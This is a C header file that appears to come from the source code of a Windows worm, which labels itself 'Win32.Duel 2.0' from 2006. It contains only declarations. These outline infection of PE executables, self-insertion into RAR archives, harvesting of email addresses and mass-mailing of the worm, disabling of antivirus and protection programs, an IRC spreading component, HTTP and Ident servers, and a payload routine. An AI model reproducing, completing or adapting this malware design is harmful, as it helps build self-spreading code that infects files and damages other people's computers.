#ifndef __Prototypez__

	#define __Prototypez__
/*
	#pragma comment(lib,"ws2_32.lib")
	#pragma comment(lib,"msvcrt.lib")
	#pragma comment(linker,"/MERGE:.text=.data")
	#if (_MSC_VER < 1300)
		#pragma comment(linker,"/IGNORE:4078")
		#pragma comment(linker,"/OPT:NOWIN98")
	#endif
	#define WIN32_LEAN_AND_MEAN
*/
	const char CopyRight[]="Win32.Duel 2.0 (c) DR-EF 2006";

	HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter);
	BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes);
	void RandomString(char *dst,int len,BOOL Gen_Numbers);
	void WaitForInetConnection();
	DWORD WINAPI WormNotify(LPVOID xvoid);
	int	InfectPeFile(char FilePath[],char VirusFile[]);
	void GetRndUserStr(char *dst,BOOL numbers);
	void Payload();
	VOID CALLBACK DisableProtectionPrograms(HWND hwnd,UINT umsg,UINT idEvent,DWORD dwTime);

	#define	Duel_Max_Mails	100
	#define NUMBER_OF_MAIL_INFO 10

	typedef struct DuelMailList{
		char	Email[Duel_Max_Mails][45];
		int		NumberOfMails;
	}Duel_MailList;

	typedef struct mailinfo
	{
		char	text[512];
		char	subject[50];
		char	attachment[50];
	}mail_info;

	typedef struct mailinfo_list
	{
		mail_info	mail_info_list[NUMBER_OF_MAIL_INFO];
		int			NumberOf_Subjects;
		int			NumberOf_Attachments;
		int			NumberOf_Texts;
		int			number_of_MIL;
	}MailInfoList;

	void InitMailList(DuelMailList &xml);
	void FindMails(char File[],DuelMailList &xml);
	void DuelMassMail(DuelMailList &xml,MailInfoList MIL,char WormPath[]);


	void AddToLog(char Data[],int Type,BOOL Success);

	#define Duel_Log_Mail_Sended		1
	#define Duel_Log_Mail_Founded		2
	#define Duel_Log_RarArchive			3
	#define Duel_Log_Executble			4
	#define Duel_Log_AV_Killed			5
	#define Duel_Log_Startup			6
	#define Duel_Log_Payload			7
	#define Duel_Log_Notify				8
	#define Duel_Log_Custom				9
	#define Duel_Log_Irc_File_Upload	10


	typedef struct IrcWormStartInfo {
		char Server[64];
		int  Port;
		int  SleepTime;
	}IrcWormSI;

	DWORD WINAPI Http_Server(LPVOID xVoid);
	DWORD WINAPI Ident_Server(LPVOID xvoid);


#endif
